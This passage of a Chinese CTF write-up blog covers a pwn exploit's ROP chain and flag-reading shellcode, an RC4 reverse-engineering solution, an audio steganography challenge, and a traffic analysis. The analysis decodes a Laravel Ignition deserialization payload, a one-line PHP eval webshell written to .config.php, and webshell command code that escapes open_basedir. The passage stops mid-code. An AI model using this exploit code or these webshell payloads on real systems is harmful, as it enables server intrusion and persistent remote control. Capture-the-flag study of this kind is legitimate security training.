rsi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rsi; ret;</span></span><br><span class="line"><span class="number">0x2000</span>,</span><br><span class="line">libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdx; ret;</span></span><br><span class="line"><span class="number">7</span>,</span><br><span class="line">libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rax; ret;</span></span><br><span class="line"><span class="number">10</span>,</span><br><span class="line">syscall, <span class="comment">#: syscall; ret;</span></span><br><span class="line">libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: jmp rsp;</span></span><br><span class="line"> ]</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub rsp, 0x800</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov eax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">cmp eax, 0</span></span><br><span class="line"><span class="string">js failed</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 0x100</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp exit</span></span><br><span class="line"><span class="string">failed:</span></span><br><span class="line"><span class="string">push 0x6c696166</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 4</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">mov eax, 231</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(flat(layout) + shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/gkm6obUGwMT1Kr3.png"><img src="https://i.loli.net/2021/10/09/gkm6obUGwMT1Kr3.png"></a></p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h4><p>先扔进pe里，发现没有壳，是个32位的程序</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/dD4xWzsJkO3Ym1Z.jpg"><img src="https://i.loli.net/2021/10/09/dD4xWzsJkO3Ym1Z.jpg"></a> </p>
<p>用32位的ida打开后先搜索字符串，第一个就是我们运行程序后看到的：</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/yedcXSzZkGgNoRx.jpg"><img src="https://i.loli.net/2021/10/09/yedcXSzZkGgNoRx.jpg"></a> </p>
<p>双击跳到字符串的地址后按Ctrl+x查找引用，然后应该是F5查看伪代码，但是发现loc_40105C这一段的代码他没有逆出来：</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/6YlpQhdPwRVKExD.jpg"><img src="https://i.loli.net/2021/10/09/6YlpQhdPwRVKExD.jpg"></a> </p>
<p>在网上查阅资料后看到一个大佬的方法：</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/mvxcnYsjflU5OkQ.jpg"><img src="https://i.loli.net/2021/10/09/mvxcnYsjflU5OkQ.jpg"></a> </p>
<p>差不多就是先按U把loc_40105C这段的汇编代码拆开：</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/zRkoav9qK7n6EcF.jpg"><img src="https://i.loli.net/2021/10/09/zRkoav9qK7n6EcF.jpg"></a> </p>
<p>然后在第二行按C再合成汇编代码，留下第一行就能进行反编译（具体原理还没时间学，就先这样用着..）：</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/zVkQGhfaxZujr49.jpg"><img src="https://i.loli.net/2021/10/09/zVkQGhfaxZujr49.jpg"></a> </p>
<p>反编译后就开始看程序的逻辑代码：</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/xVjhYfXuDdnLBEv.jpg"><img src="https://i.loli.net/2021/10/09/xVjhYfXuDdnLBEv.jpg"></a> </p>
<p>这里我们可以看到256出现了很多次，联想到rc4加密，开始根据逻辑找秘钥。这里这个qword_402108双击进去，然后按A转换成字符串，也就是秘钥。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/MUyHlvbaJ1erPVC.jpg"><img src="https://i.loli.net/2021/10/09/MUyHlvbaJ1erPVC.jpg"></a> </p>
<p>这个输出上面的这一部分是密文，要先用base64解一下</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/h82QEu7PRFG5xA3.jpg"><img src="https://i.loli.net/2021/10/09/h82QEu7PRFG5xA3.jpg"></a> </p>
<p>另外在写脚本的时候发现，这个rc4加密是个变异的，在这里有个异或0x37：</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/9OVqnwANWDuYozc.jpg"><img src="https://i.loli.net/2021/10/09/9OVqnwANWDuYozc.jpg"></a> </p>
<p>下面是脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">Str, key</span>):</span></span><br><span class="line">    a = b = <span class="number">0</span></span><br><span class="line">    list2 = <span class="built_in">range</span>(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        a = (a + list2[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        list2[i], list2[a] = list2[a], list2[i]^<span class="number">0x37</span></span><br><span class="line"></span><br><span class="line">    list1 = []</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Str) - <span class="number">8</span>):</span><br><span class="line">        a = (a + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        b = (b + list2[a]) % <span class="number">256</span></span><br><span class="line">        list2[a], list2[b] = list2[b], list2[a]</span><br><span class="line">        list1.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(Str[i]) ^ list2[(list2[a] + list2[b]) % <span class="number">256</span>]))</span><br><span class="line">        <span class="comment"># print(out)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(list1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">Str, key, salt_length=<span class="number">16</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        Str = base64.b64decode(Str)</span><br><span class="line">    <span class="keyword">return</span> fun(Str, key)</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;9YyN5J+lKGUw9OvTJKmRGm/UatcLjei4g0pabr7L9EuZ1uZUek9QFOXsXFhGRlxYRkY=&#x27;</span> <span class="comment"># 密文</span></span><br><span class="line">key = <span class="string">&#x27;tallmewhy&#x27;</span></span><br><span class="line">decodedStr = decode(str1, key)</span><br><span class="line"><span class="built_in">print</span> decodedStr</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>flag&#123;c5e0f5f6-f79e-5b9b-988f-28f046117802&#125;</code></p>
</blockquote>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h4><p>下载好附件丢到010，发现是wav文件。于是将附件后缀名重命名为wav</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/2QBmjMPezKRLYVd.png"><img src="https://i.loli.net/2021/10/09/2QBmjMPezKRLYVd.png"></a></p>
<p>丢到 Audacity软件中</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/zNgdQl8G19hre3B.png"><img src="https://i.loli.net/2021/10/09/zNgdQl8G19hre3B.png"></a></p>
<p>猜测这部分有东西，于是将这部分保存出来，使用在线工具查看频谱得到flag。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/ToNYbJCV7iMac1g.png"><img src="https://i.loli.net/2021/10/09/ToNYbJCV7iMac1g.png"></a></p>
<p>得到flag</p>
<blockquote>
<p><code>flag&#123;f8fbb2c761821d3af23858f721cc140b&#125;</code></p>
</blockquote>
<h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>这题拿到附近，先大致滚了几圈看了下，HTTP流量挺多的，所以先去看看HTTP的包，因为个人比较习惯用<code>Fiddler</code>，所以是把<code>pcap</code>导到<code>Fiddler</code>做的。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/fdMIO9jPKxqLiom.png"><img src="https://i.loli.net/2021/09/29/fdMIO9jPKxqLiom.png"></a></p>
<p>先过滤下无关流量（2345的广告流量老干扰项了），仅保留本机和服务器ip的流量。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/SteQVcNDJxZk8d1.png"><img src="https://i.loli.net/2021/09/29/SteQVcNDJxZk8d1.png"></a></p>
<p>开头有一堆nmap批量扫的流量，感觉没啥用，先不看。</p>
<p>先是找到了一个感觉像CVE的流量包，上网查了下关键词<code>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>确实是个CVE。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/kibW94MRgDqf2UL.png"><img src="https://i.loli.net/2021/09/29/kibW94MRgDqf2UL.png"></a></p>
<p>根据相关的漏洞文章尝试解码数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00B=00A=00Q=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00q=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00c=007=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00c=00j=00o=00z=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00l=00N=00p=00e=00m=00U=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00I=00i=00O=002=00E=006=00M=00T=00p=007=00a=00T=00o=00w=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00j=00o=00i=00d=002=00h=00v=00Y=00W=001=00p=00I=00j=00t=00z=00O=00j=00U=006=00I=00m=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=001=009=00c=00z=00o=004=00O=00i=00I=00A=00K=00g=00B=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00p=00b=00m=00l=000=00a=00W=00F=00s=00a=00X=00p=00l=00Z=00C=00I=007=00Y=00j=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00k=00x=00p=00b=00W=00l=000=00I=00j=00t=00p=00O=00i=000=00x=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00H=00B=00y=00b=002=00N=00l=00c=003=00N=00v=00c=00n=00M=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00Y=003=00V=00y=00c=00m=00V=00u=00d=00C=00I=007=00a=00T=00o=00x=00O=003=00M=006=00N=00j=00o=00i=00c=003=00l=00z=00d=00G=00V=00t=00I=00j=00t=009=00f=00X=001=00p=00O=00j=00c=007=00a=00T=00o=003=00O=003=000=00F=00A=00A=00A=00A=00Z=00H=00V=00t=00b=00X=00k=00E=00A=00A=00A=00A=00E=000=00t=00L=00Y=00Q=00Q=00A=00A=00A=00A=00M=00f=00n=00/=00Y=00t=00g=00E=00A=00A=00A=00A=00A=00A=00A=00A=00I=00A=00A=00A=00A=00d=00G=00V=00z=00d=00C=005=000=00e=00H=00Q=00E=00A=00A=00A=00A=00E=000=00t=00L=00Y=00Q=00Q=00A=00A=00A=00A=00M=00f=00n=00/=00Y=00t=00g=00E=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00d=00G=00V=00z=00d=00B=00Y=00S=00o=00S=004=00e=002=00I=00+=00d=00c=003=00S=00r=00w=00+=00W=00R=00x=00i=00o=003=00Z=00S=00H=005=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00=00&#x27;</span></span><br><span class="line">a = a.replace(<span class="string">&#x27;=00&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/MufazkrvVgPxpKc.png"><img src="https://i.loli.net/2021/09/29/MufazkrvVgPxpKc.png"></a></p>
<p>得到<code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrBAQAAAgAAABEAAAABAAAAAABqAQAAYToyOntpOjc7TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjozO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX1pOjc7aTo3O30FAAAAZHVtbXkEAAAAE0tLYQQAAAAMfn/YtgEAAAAAAAAIAAAAdGVzdC50eHQEAAAAE0tLYQQAAAAMfn/YtgEAAAAAAAB0ZXN0dGVzdBYSoS4e2I+dc3Srw+WRxio3ZSH5AgAAAEdCTUI</code>，但是在python里面好像解不出来，就去拿js解了。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/CfPAzBxsc1mva8Q.png"><img src="https://i.loli.net/2021/09/29/CfPAzBxsc1mva8Q.png"></a></p>
<p>看着感觉就是执行了<code>whoami</code>，下面的数据包也证实了确实如此。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/HvFYmafnkOK8LUx.png"><img src="https://i.loli.net/2021/09/29/HvFYmafnkOK8LUx.png"></a></p>
<p>那就去看最后一个同类数据包呗，按理来说最后一个都是打通了的情况。</p>
<p>最后一个的payload是<code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00o=00J=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00C=00y=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00c=007=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00c=00j=00o=00z=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00l=00N=00p=00e=00m=00U=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00I=00i=00O=002=00E=006=00M=00T=00p=007=00a=00T=00o=00w=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00c=006=00I=00m=00V=00j=00a=00G=008=00g=00X=00j=00w=00/=00c=00G=00h=00w=00I=00E=00B=00l=00d=00m=00F=00s=00K=00E=00B=00n=00e=00m=00l=00u=00Z=00m=00x=00h=00d=00G=00U=00o=00Y=00m=00F=00z=00Z=00T=00Y=000=00X=002=00R=00l=00Y=002=009=00k=00Z=00S=00g=00k=00X=001=00B=00P=00U=001=00R=00b=00M=00T=00Q=000=00M=00z=00N=00d=00K=00S=00k=00p=00O=00z=009=00e=00P=00i=00A=00+=00I=00C=005=00j=00b=002=005=00m=00a=00W=00c=00u=00c=00G=00h=00w=00I=00j=00t=00z=00O=00j=00U=006=00I=00m=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=001=009=00c=00z=00o=004=00O=00i=00I=00A=00K=00g=00B=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00p=00b=00m=00l=000=00a=00W=00F=00s=00a=00X=00p=00l=00Z=00C=00I=007=00Y=00j=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00k=00x=00p=00b=00W=00l=000=00I=00j=00t=00p=00O=00i=000=00x=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00H=00B=00y=00b=002=00N=00l=00c=003=00N=00v=00c=00n=00M=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00Y=003=00V=00y=00c=00m=00V=00u=00d=00C=00I=007=00a=00T=00o=00x=00O=003=00M=006=00N=00j=00o=00i=00c=003=00l=00z=00d=00G=00V=00t=00I=00j=00t=009=00f=00X=001=00p=00O=00j=00c=007=00a=00T=00o=003=00O=003=000=00F=00A=00A=00A=00A=00Z=00H=00V=00t=00b=00X=00k=00E=00A=00A=00A=00A=00X=00E=00t=00L=00Y=00Q=00Q=00A=00A=00A=00A=00M=00f=00n=00/=00Y=00t=00g=00E=00A=00A=00A=00A=00A=00A=00A=00A=00I=00A=00A=00A=00A=00d=00G=00V=00z=00d=00C=005=000=00e=00H=00Q=00E=00A=00A=00A=00A=00X=00E=00t=00L=00Y=00Q=00Q=00A=00A=00A=00A=00M=00f=00n=00/=00Y=00t=00g=00E=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00d=00G=00V=00z=00d=00D=00Z=006=00P=00U=00p=00j=00h=00k=00a=00y=00y=00N=00i=00Q=003=00Y=00w=00m=00f=00p=00c=008=00Q=00J=00n=00s=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00=00</code>，解了混淆之后是<code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQoJAgAAAgAAABEAAAABAAAAAACyAQAAYToyOntpOjc7TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjozO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Nzc6ImVjaG8gXjw/cGhwIEBldmFsKEBnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkX1BPU1RbMTQ0MzNdKSkpOz9ePiA+IC5jb25maWcucGhwIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX1pOjc7aTo3O30FAAAAZHVtbXkEAAAAXEtLYQQAAAAMfn/YtgEAAAAAAAAIAAAAdGVzdC50eHQEAAAAXEtLYQQAAAAMfn/YtgEAAAAAAAB0ZXN0dGVzdDZ6PUpjhkayyNiQ3Ywmfpc8QJnsAgAAAEdCTUI</code>，然后解一下base64，确实得到了一个写文件的操作。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/rehbcasuK5kZEPU.png"><img src="https://i.loli.net/2021/09/29/rehbcasuK5kZEPU.png"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php</span><br></pre></td></tr></table></figure>

<p>看着就是gzip套base64过防火墙，那就接着看下面的<code>.config.php</code>的流量，第一个传了数据的包如下，不用解码都知道是列文件，对咱没啥用，就不管。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/I8DNuFTYd4LQxzK.png"><img src="https://i.loli.net/2021/09/29/I8DNuFTYd4LQxzK.png"></a></p>
<p>然后又看到了一个压缩包读取的，说不定有用，先存下来，但是打开要密码。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/CodPnvqSlUhzEAN.png"><img src="https://i.loli.net/2021/09/29/CodPnvqSlUhzEAN.png"></a></p>
<p>紧接着没几个数据包，就来了个7z命令行解压的，那不用说，密码肯定在上面的传参里面。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/wmEn1PzgoDbtTWB.png"><img src="https://i.loli.net/2021/09/29/wmEn1PzgoDbtTWB.png"></a><br>那就解码一下命令。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/t6AHvbkQjuzWiBm.png"><img src="https://i.loli.net/2021/09/29/t6AHvbkQjuzWiBm.png"></a></p>
<p>先是得到了个<code>@eval(@gzinflate(base64_decode($_POST[_0x0d4e2de6c1fa7])));</code>，好家伙，又套娃，那就去看下一个命令，反正编码逻辑一样。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/CtU9BIhpnM6oxHY.png"><img src="https://i.loli.net/2021/09/29/CtU9BIhpnM6oxHY.png"></a></p>
<p>得到了如下php代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="variable">$opdir</span>=@ini_get(<span class="string">&quot;open_basedir&quot;</span>);<span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;<span class="variable">$ocwd</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$oparr</span>=preg_split(<span class="string">&quot;/;|:/&quot;</span>,<span class="variable">$opdir</span>);@array_push(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,sys_get_temp_dir());<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">if</span>(!@is_writable(<span class="variable">$item</span>))&#123;<span class="keyword">continue</span>;&#125;;<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.fedd1&quot;</span>;@mkdir(<span class="variable">$tmdir</span>);<span class="keyword">if</span>(!@file_exists(<span class="variable">$tmdir</span>))&#123;<span class="keyword">continue</span>;&#125;@chdir(<span class="variable">$tmdir</span>);@ini_set(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);<span class="variable">$cntarr</span>=@preg_split(<span class="string">&quot;/\\\\\\\\|\\//&quot;</span>,<span class="variable">$tmdir</span>);<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;sizeof(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;@chdir(<span class="string">&quot;..&quot;</span>);&#125;;@ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);@rmdir(<span class="variable">$tmdir</span>);<span class="keyword">break</span>;&#125;;&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;36&quot;</span>.<span class="string">&quot;4f2&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;42&quot;</span>.<span class="string">&quot;ff1&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;f861d394170244&quot;</span>],<span class="number">2</span>));<span class="variable">$s</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;ufbd335828f30f&quot;</span>],<span class="number">2</span>));<span class="variable">$envstr</span>=@base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;b430b310838a93&quot;</span>],<span class="number">2</span>));<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \\&quot;</span>&#123;<span class="variable">$s</span>&#125;\\<span class="string">&quot;&quot;</span>:<span class="string">&quot;/c \\&quot;</span>&#123;<span class="variable">$s</span>&#125;\\<span class="string">&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span 